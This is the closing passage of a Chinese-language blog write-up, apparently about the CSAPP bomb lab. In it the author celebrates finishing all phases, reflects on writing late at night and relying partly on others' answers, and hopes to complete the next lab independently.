![image-20240302010809099](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220099.png)

至此,圆满完成通关!

# 小记

这篇详解是我在第一次做时边做边写的,做完phase_5后又兴致大发开始梳理编写,现在是3月2日的凌晨2:16分,大脑又困又转动.

实话实说,做这个真的很有意思,虽然我看了不少人的答案,毕竟一开始真的不能理解,不过现在大都理解了,这是一共的文件数量,做完整个lab.

![image-20240302021849311](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220164.png)

希望下一次能够独立做出lab!这才是更大的进步!

> Good Luck:生命不止,奋斗不息
